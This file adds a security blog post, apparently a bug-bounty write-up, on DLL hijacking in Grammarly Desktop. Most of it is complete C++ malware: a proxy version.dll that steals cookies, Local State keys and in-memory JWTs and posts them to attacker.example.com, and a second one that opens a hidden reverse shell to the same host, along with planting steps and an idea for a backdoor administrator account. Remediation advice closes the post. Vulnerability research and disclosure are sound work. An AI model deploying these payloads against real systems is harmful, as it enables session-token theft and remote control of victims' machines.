@@ -1,0 +1,465 @@
+import type { Post, PostMeta } from "../posts";
+
+export const meta: PostMeta = {
+    slug: "grammarly-dll-hijacking-blog",
+    title: "Hijacking Grammarly Desktop: How a Missing DLL Leads to Silent Code Execution",
+    date: "2026-05-28",
+    category: "Windows",
+    tags: [
+        "grammarly",
+        "dll-hijacking",
+        "windows",
+        "red-team",
+        "penetration-testing",
+        "vulnerability"
+    ],
+    severity: "Critical",
+    excerpt: "Grammarly Desktop is a widely used writing assistant that runs in the background on Windows, checking grammar and spelling across applications. The application runs as a trusted, signed binary. We found that Grammarly Desktop loads several Windows system libraries from its own local application folder instead of from protected system directories. Because this folder lives inside the user's AppData directory, any code running as that user can place a malicious DLL file there. When Grammarly starts, it loads and executes the attacker's code with the same privileges as the logged-in user. This post explains how the vulnerability works, demonstrates three proof-of-concept attacks, and discusses how to fix the underlying flaw.",
+    readTime: "13 min",
+    sections: [
+        { id: "introduction", title: "01 · Introduction" },
+        { id: "what-is-dll-hijacking", title: "02 · What Is DLL Hijacking?" },
+        { id: "vulnerability-details", title: "03 · Vulnerability Details" },
+        { id: "proof-of-concept-1-basic-execution-confirmation", title: "04 · Proof of Concept 1: Basic Execution Confirmation" },
+        { id: "proof-of-concept-2-credential-and-session-token-theft", title: "05 · Proof of Concept 2: Credential and Session Token Theft" },
+        { id: "proof-of-concept-3-reverse-shell-and-persistent-backdoor", title: "06 · Proof of Concept 3: Reverse Shell and Persistent Backdoor" },
+        { id: "impact-analysis", title: "07 · Impact Analysis" },
+        { id: "remediation-recommendations", title: "08 · Remediation Recommendations" },
+        { id: "conclusion-and-takeaways", title: "09 · Conclusion and Takeaways" },
+    ],
+};
+
+export const post: Post = {
+    ...meta,
+    content: `
+![Banner](https://i.imgur.com/UXhIe8a.png)
+
+## Introduction
+
+Grammarly Desktop is a widely used writing assistant that runs in the background on Windows, checking grammar and spelling across applications. The application runs as a trusted, signed binary. We found that Grammarly Desktop loads several Windows system libraries from its own local application folder instead of from protected system directories. Because this folder lives inside the user's AppData directory, any code running as that user can place a malicious DLL file there. When Grammarly starts, it loads and executes the attacker's code with the same privileges as the logged-in user. This post explains how the vulnerability works, demonstrates three proof-of-concept attacks, and discusses how to fix the underlying flaw.
+
+## What Is DLL Hijacking?
+
+Dynamic Link Libraries, or DLLs, are files that contain code and data shared across Windows programs. When an application needs a DLL, it typically asks Windows to load it by name, such as \`version.dll\`. Windows then searches a specific list of folders to find that file. The search usually starts in the application's own folder before it looks in secure system folders like \`C:\\Windows\\System32\`.
+
+DLL hijacking happens when an attacker places a malicious file with the same name into a folder that Windows checks early in the search order. The application loads the attacker's code instead of the real library. Because the malicious code now runs inside a legitimate, trusted process, security software often treats the activity as safe. The attacker gains code execution with the application's privileges, and the victim may never see a warning.
+
+## Vulnerability Details
+
+### Summary
+
+The Grammarly Desktop application attempts to load multiple system DLLs---specifically \`version.dll\`, \`oleacc.dll\`, and \`bcrypt.dll\`---from its local execution directory:
+
+\`\`\`
+C:\\Users\\<username>\\AppData\\Local\\Grammarly\\DesktopIntegrations\\
+\`\`\`
+
+This directory inherits write permissions from the parent AppData folder. Any low-privileged process running as the same user, or a malicious script, can drop a file named \`version.dll\` into that folder. When Grammarly Desktop starts, the Windows Loader satisfies the DLL request using the attacker's file. Because Grammarly is a signed and trusted application, the malicious code runs inside a legitimate process, bypassing many security controls.
+
+### Technical Analysis
+
+Using Process Monitor (ProcMon), we observed that \`Grammarly.Desktop.exe\` searches for \`version.dll\` inside the \`DesktopIntegrations\` folder and receives a \`NAME NOT FOUND\` result because the file does not exist in that location under normal circumstances.
+
+![ProcMon filters](https://i.imgur.com/m47Bdn9.png)
+
+To reproduce this, configure ProcMon with filters that capture \`Grammarly.Desktop.exe\` activity and isolate \`CreateFile\` operations that reference the \`DesktopIntegrations\` path. After applying the filters, launch the Grammarly application.
+
+![ProcMon results](https://i.imgur.com/cxYbzo3.png)
+
+The filtered output shows repeated DLL search attempts returning \`NAME NOT FOUND\`. Each attempt confirms that Grammarly is searching its local, user-writable directory before falling back to the secure system directory. This behavior is the root cause of the vulnerability.
+
+## Proof of Concept 1: Basic Execution Confirmation
+
+The first proof of concept confirms that arbitrary code can run inside the Grammarly process. It writes a file to the Public directory and displays a message box.
+
+### Step 1: Malicious Payload Construction
+
+The following C++ code compiles as a 64-bit DLL. It forwards the real \`version.dll\` exports to a copy of the original library so that Grammarly continues to function normally while the payload runs.
+
+\`\`\`cpp
+#include "pch.h"
+#include <windows.h>
+#include <fstream>
+#include <string>
+#include <windows.h>
+#include <fstream>
+
+void Success() {
+    std::ofstream file("C:\\Users\\Public\\Grammarly_Pwned.txt");
+    file << "DLL Hijack Successful - Running as: ";
+
+    char* username = nullptr;
+    size_t len = 0;
+    if (_dupenv_s(&username, &len, "USERNAME") == 0 && username != nullptr)
+    {
+        file << username;
+        free(username);
+    }
+    else
+    {
+        file << "<unknown>";
+    }
+
+    file.close();
+
+    MessageBoxA(NULL, "Vulnerability Confirmed!", "Bug Bounty PoC", MB_OK);
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Success, NULL, 0, NULL);
+    }
+    return TRUE;
+}
+\`\`\`
+
+### Step 2: Reproduction Steps
+
+1. Copy \`C:\\Windows\\System32\\version.dll\` to \`C:\\Users\\<User>\\AppData\\Local\\Grammarly\\DesktopIntegrations\\version_org.dll\`.
+2. Compile the code above as a 64-bit DLL.
+3. Rename the output file to \`version.dll\`.
+4. Copy the file to \`C:\\Users\\<User>\\AppData\\Local\\Grammarly\\DesktopIntegrations\\\`.
+5. Launch the Grammarly Desktop application.
+6. **Result:** A message box appears immediately, and the file \`C:\\Users\\Public\\Grammarly_Pwned.txt\` is created, proving successful code execution.
+
+<div style="position:relative; width:100%; height:0px; padding-bottom:56.250%"><iframe allow="fullscreen" allowfullscreen height="100%" src="https://streamable.com/e/eqp7gw?" width="100%" style="border:none; width:100%; height:100%; position:absolute; left:0px; top:0px; overflow:hidden;"></iframe></div>
+
+## Proof of Concept 2: Credential and Session Token Theft
+
+This proof of concept locates the WebView2 profile data, copies the cookie database and local state files, scans process memory for live JSON Web Tokens, and sends everything to an attacker-controlled server.
+
+### Attack Goal
+
+Grammarly keeps users signed in via OAuth and session cookies. By stealing these tokens, an attacker can impersonate the victim on the Grammarly service and potentially on any linked accounts, all without knowing the victim's password.
+
+### Malicious DLL Code
+
+\`\`\`cpp
+#include <windows.h>
+#include <string>
+#include <fstream>
+#include <vector>
+#include <winhttp.h>
+#include <shlwapi.h>
+
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "shlwapi.lib")
+
+// Forward exports to the real version.dll (copy original to version_org.dll)
+#pragma comment(linker, "/export:GetFileVersionInfoA=version_org.GetFileVersionInfoA")
+#pragma comment(linker, "/export:GetFileVersionInfoByHandle=version_org.GetFileVersionInfoByHandle")
+#pragma comment(linker, "/export:GetFileVersionInfoExA=version_org.GetFileVersionInfoExA")
+#pragma comment(linker, "/export:GetFileVersionInfoExW=version_org.GetFileVersionInfoExW")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeA=version_org.GetFileVersionInfoSizeA")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=version_org.GetFileVersionInfoSizeExA")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=version_org.GetFileVersionInfoSizeExW")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeW=version_org.GetFileVersionInfoSizeW")
+#pragma comment(linker, "/export:GetFileVersionInfoW=version_org.GetFileVersionInfoW")
+#pragma comment(linker, "/export:VerFindFileA=version_org.VerFindFileA")
+#pragma comment(linker, "/export:VerFindFileW=version_org.VerFindFileW")
+#pragma comment(linker, "/export:VerInstallFileA=version_org.VerInstallFileA")
+#pragma comment(linker, "/export:VerInstallFileW=version_org.VerInstallFileW")
+#pragma comment(linker, "/export:VerLanguageNameA=version_org.VerLanguageNameA")
+#pragma comment(linker, "/export:VerLanguageNameW=version_org.VerLanguageNameW")
+#pragma comment(linker, "/export:VerQueryValueA=version_org.VerQueryValueA")
+#pragma comment(linker, "/export:VerQueryValueW=version_org.VerQueryValueW")
+
+// Send collected data to the attacker server via HTTP POST
+// We Talk about why send data in POST req for Data Exfiltration in '/logs/data-exfiltration-guide#http-exfiltration'
+void Exfiltrate(const std::string& payload) {
+    HINTERNET hSession = WinHttpOpen(L"GrammarlyDesktop/1.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (!hSession) return;
+
+    HINTERNET hConnect = WinHttpConnect(hSession, L"attacker.example.com", 8080, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/exfil",
+        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    std::wstring headers = L"Content-Type: application/x-www-form-urlencoded";
+    WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(),
+        (LPVOID)payload.c_str(), (DWORD)payload.length(), (DWORD)payload.length(), 0);
+    WinHttpReceiveResponse(hRequest, NULL);
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+}
+
+// Recursively copy WebView2 storage files (cookies, local state, session logs)
+void CopyTokenFiles(const std::string& srcDir, const std::string& dstDir) {
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA((srcDir + "\\\\*").c_str(), &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+
+    do {
+        std::string name = fd.cFileName;
+        if (name == "." || name == "..") continue;
+
+        std::string srcPath = srcDir + "\\\\" + name;
+        std::string dstPath = dstDir + "\\\\" + name;
+
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            CreateDirectoryA(dstPath.c_str(), NULL);
+            CopyTokenFiles(srcPath, dstPath);
+        } else {
+            // Target SQLite cookies, JSON state files, and LevelDB logs
+            if (name == "Cookies" || name == "Local State" ||
+                name.find(".log") != std::string::npos ||
+                name.find("Session") != std::string::npos) {
+                CopyFileA(srcPath.c_str(), dstPath.c_str(), FALSE);
+            }
+        }
+    } while (FindNextFileA(hFind, &fd));
+    FindClose(hFind);
+}
+
+// Scan readable process memory for JWT headers (eyJ) and Grammarly domain strings
+void ScanMemoryForTokens(std::string& buffer) {
+    SYSTEM_INFO si;
+    GetSystemInfo(&si);
+
+    char* addr = (char*)si.lpMinimumApplicationAddress;
+    MEMORY_BASIC_INFORMATION mbi;
+
+    while (addr < (char*)si.lpMaximumApplicationAddress) {
+        if (VirtualQuery(addr, &mbi, sizeof(mbi)) == 0) break;
+
+        if (mbi.State == MEM_COMMIT &&
+            (mbi.Protect == PAGE_READONLY || mbi.Protect == PAGE_READWRITE)) {
+
+            std::vector<char> region(mbi.RegionSize);
+            SIZE_T read = 0;
+            if (ReadProcessMemory(GetCurrentProcess(), mbi.BaseAddress,
+                                  region.data(), mbi.RegionSize, &read)) {
+                for (size_t i = 0; i + 10 < read; ++i) {
+                    // Detect JWT start pattern: eyJ
+                    if (region[i] == 'e' && region[i+1] == 'y' && region[i+2] == 'J') {
+                        size_t end = i;
+                        while (end < read && end < i + 2048 &&
+                               region[end] != '\\0' && region[end] != '"' &&
+                               region[end] != ' ' && region[end] != ',')
+                            ++end;
+                        buffer += "jwt=" + std::string(region.data() + i, end - i) + "&";
+                    }
+                }
+            }
+        }
+        addr += mbi.RegionSize;
+    }
+}
+
+DWORD WINAPI TokenTheftThread(LPVOID) {
+    // Wait for Grammarly and WebView2 to initialize
+    Sleep(15000);
+
+    char* localAppData = nullptr;
+    size_t len = 0;
+    if (_dupenv_s(&localAppData, &len, "LOCALAPPDATA") != 0 || !localAppData)
+        return 1;
+
+    std::string grammarlyDir = std::string(localAppData) + "\\\\Grammarly";
+    free(localAppData);
+
+    std::string staging = "C:\\\\Users\\\\Public\\\\G_Stage";
+    CreateDirectoryA(staging.c_str(), NULL);
+
+    // Copy profile data to a staging area
+    CopyTokenFiles(grammarlyDir, staging);
+
+    // Build exfiltration payload
+    std::string payload = "host=";
+    char* computerName = nullptr;
+    size_t cnLen = 0;
+    if (_dupenv_s(&computerName, &cnLen, "COMPUTERNAME") == 0 && computerName) {
+        payload += computerName;
+        free(computerName);
+    } else {
+        payload += "unknown";
+    }
+    payload += "&";
+
+    // Read the Local State file (contains encryption keys for cookies)
+    std::ifstream ls(staging + "\\\\Local State", std::ios::binary);
+    if (ls) {
+        std::string lsData((std::istreambuf_iterator<char>(ls)),
+                           std::istreambuf_iterator<char>());
+        payload += "local_state=" + lsData + "&";
+    }
+
+    // Scan live memory for active session tokens
+    ScanMemoryForTokens(payload);
+
+    // Exfiltrate to remote server and write local copy
+    Exfiltrate(payload);
+
+    std::ofstream out("C:\\\\Users\\\\Public\\\\G_Tokens.txt");
+    out << payload;
+    out.close();
+
+    return 0;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hModule);
+        CreateThread(NULL, 0, TokenTheftThread, NULL, 0, NULL);
+    }
+    return TRUE;
+}
+\`\`\`
+
+### Reproduction Steps
+
+1. Copy the original \`C:\\Windows\\System32\\version.dll\` to the Grammarly \`DesktopIntegrations\` folder as \`version_org.dll\`.
+2. Compile the code above as a 64-bit DLL and rename it to \`version.dll\`.
+3. Place the malicious \`version.dll\` in \`C:\\Users\\<User>\\AppData\\Local\\Grammarly\\DesktopIntegrations\\\`.
+4. Ensure an HTTP listener is running on \`attacker.example.com:8080/exfil\`.
+5. Launch Grammarly Desktop and wait roughly 15 seconds for the payload to trigger.
+6. **Result:** The attacker server receives a POST request containing the victim's computer name and any JWT tokens found in memory. A local copy is also saved to \`C:\\Users\\Public\\G_Tokens.txt\`.
+
+### Damage Assessment
+
+With stolen OAuth tokens and session cookies, an attacker can impersonate the victim on Grammarly and any linked services. If the victim uses Grammarly's single sign-on features, the attacker may gain access to corporate documents, email drafts, or cloud storage. Because the exfiltration happens from a trusted process, outbound web requests are unlikely to trigger firewall alerts.
+
+## Proof of Concept 3: Reverse Shell and Persistent Backdoor
+
+This proof of concept turns the Grammarly process into a command-and-control channel. Instead of stealing data immediately, the malicious DLL opens a reverse TCP shell back to the attacker, granting interactive remote access to the victim machine.
+
+### Attack Goal
+
+A reverse shell allows an attacker to execute arbitrary commands on the victim system interactively. Because the connection originates from a signed, **trusted application, it can bypass outbound firewall rules that would normally block unknown programs.** As an alternative, the same DLL could **create a hidden local administrator account for persistent access.**
+
+### Malicious DLL Code
+
+\`\`\`cpp
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+// Forward exports to the real version.dll (copy original to version_org.dll)
+#pragma comment(linker, "/export:GetFileVersionInfoA=version_org.GetFileVersionInfoA")
+#pragma comment(linker, "/export:GetFileVersionInfoByHandle=version_org.GetFileVersionInfoByHandle")
+#pragma comment(linker, "/export:GetFileVersionInfoExA=version_org.GetFileVersionInfoExA")
+#pragma comment(linker, "/export:GetFileVersionInfoExW=version_org.GetFileVersionInfoExW")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeA=version_org.GetFileVersionInfoSizeA")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=version_org.GetFileVersionInfoSizeExA")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=version_org.GetFileVersionInfoSizeExW")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeW=version_org.GetFileVersionInfoSizeW")
+#pragma comment(linker, "/export:GetFileVersionInfoW=version_org.GetFileVersionInfoW")
+#pragma comment(linker, "/export:VerFindFileA=version_org.VerFindFileA")
+#pragma comment(linker, "/export:VerFindFileW=version_org.VerFindFileW")
+#pragma comment(linker, "/export:VerInstallFileA=version_org.VerInstallFileA")
+#pragma comment(linker, "/export:VerInstallFileW=version_org.VerInstallFileW")
+#pragma comment(linker, "/export:VerLanguageNameA=version_org.VerLanguageNameA")
+#pragma comment(linker, "/export:VerLanguageNameW=version_org.VerLanguageNameW")
+#pragma comment(linker, "/export:VerQueryValueA=version_org.VerQueryValueA")
+#pragma comment(linker, "/export:VerQueryValueW=version_org.VerQueryValueW")
+
+DWORD WINAPI ReverseShellThread(LPVOID) {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;
+
+    // Create a TCP socket
+    SOCKET sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if (sock == INVALID_SOCKET) {
+        WSACleanup();
+        return 1;
+    }
+
+    sockaddr_in target;
+    target.sin_family = AF_INET;
+    target.sin_port = htons(4444);
+    InetPtonW(AF_INET, L"attacker.example.com", &target.sin_addr);
+
+    // Connect back to the attacker
+    if (connect(sock, (sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
+        closesocket(sock);
+        WSACleanup();
+        return 1;
+    }
+
+    // Redirect standard input, output, and error to the socket
+    STARTUPINFOA si = { sizeof(si) };
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = (HANDLE)sock;
+    si.hStdOutput = (HANDLE)sock;
+    si.hStdError = (HANDLE)sock;
+
+    PROCESS_INFORMATION pi = { 0 };
+    char cmdLine[] = "cmd.exe";
+
+    // Spawn a hidden command prompt tied to the socket
+    CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
+                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+    // Keep the shell alive until the attacker closes the connection
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    closesocket(sock);
+    WSACleanup();
+    return 0;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hModule);
+        CreateThread(NULL, 0, ReverseShellThread, NULL, 0, NULL);
+    }
+    return TRUE;
+}
+\`\`\`
+
+### Reproduction Steps
+
+1. Copy the original \`C:\\Windows\\System32\\version.dll\` to the Grammarly \`DesktopIntegrations\` folder as \`version_org.dll\`.
+2. Compile the code above as a 64-bit DLL and rename it to \`version.dll\`.
+3. Place the malicious DLL in \`C:\\Users\\<User>\\AppData\\Local\\Grammarly\\DesktopIntegrations\\\`.
+4. Start a netcat or Metasploit listener on \`attacker.example.com:4444\`.
+5. Launch Grammarly Desktop.
+6. **Result:** The attacker receives an interactive Windows command prompt running under the victim's user account. The process tree shows \`Grammarly.Desktop.exe\` as the parent, masking the malicious activity.
+
+### Damage Assessment
+
+An interactive reverse shell gives the attacker full control over the victim's session. They can install additional malware, pivot to other machines on the network, steal files, or enable remote desktop access. Because the connection originates from a trusted application, endpoint detection tools may not flag the network traffic. If the attacker chooses the backdoor variant instead, they can create a hidden administrator account that survives reboots and reinstalls, maintaining access even if the DLL is later removed.
+
+## Impact Analysis
+
+The original vulnerability grants an attacker reliable code execution inside a trusted process. The three proof-of-concept attacks show how that execution can escalate from a simple confirmation to serious breaches.
+
+**Evasion and Persistence.** Grammarly Desktop often starts automatically with Windows. A malicious DLL placed in the application folder achieves persistence without modifying the registry or creating new startup items. Security tools frequently whitelist activity from signed binaries like \`Grammarly.Desktop.exe\`, so the attacker's code can operate for long periods without detection.
+
+**Lateral Movement.** On shared workstations or terminal servers, an attacker can place the malicious DLL in every user's Grammarly folder. When each user logs in and launches Grammarly, the attacker gains code execution under that user's account, moving laterally across sessions on the same machine.
+
+**Remote Control and Backdoors.** As demonstrated in Proof of Concept 3, the attacker can establish a live command channel or create persistent system accounts. This transforms a single compromised writing assistant into a beachhead for broader network compromise.
+
+## Remediation Recommendations
+
+Grammarly can eliminate this vulnerability by changing how the application loads system libraries.
+
+**Use Absolute Paths.** Instead of asking Windows to load \`version.dll\` by name alone, the application should supply the full, canonical path: \`C:\\Windows\\System32\\version.dll\`. This removes the user-writable application directory from the search order entirely.
+
+**Restrict Search Directories.** Before loading any DLL, Grammarly should call the Windows API \`SetDefaultDllDirectories\` with the flag \`LOAD_LIBRARY_SEARCH_SYSTEM32\`. This tells the loader to look only in the System32 folder for unnamed system libraries, preventing the current directory from being checked.
+
+**Verify Digital Signatures.** Before a DLL is loaded, Grammarly can use the \`WinVerifyTrust\` API to check that the file carries a valid Microsoft or Grammarly digital signature. If the DLL on disk does not match the expected signer, the application should refuse to load it and alert the user.
+
+**Avoid Loading by Name Only.** The application should audit every DLL load operation. Any call to \`LoadLibrary\` or \`LoadLibraryEx\` that passes a bare filename without a path should be treated as a potential security risk and rewritten to use a fully qualified path.
+
+
+## Conclusion and Takeaways
+
+DLL hijacking remains a common and dangerous weakness in Windows applications. The Grammarly Desktop case shows that even modern, widely used software can fall victim to simple search-order flaws. The application's decision to load system libraries from a user-writable folder created a gap that any local attacker or malicious script could exploit.
+
+For defenders, this finding reinforces the importance of monitoring application startup folders and watching for unsigned DLLs inside AppData. For developers, it is a reminder to always load system libraries with absolute paths and to restrict the DLL search path to trusted directories.
+  `,
+};
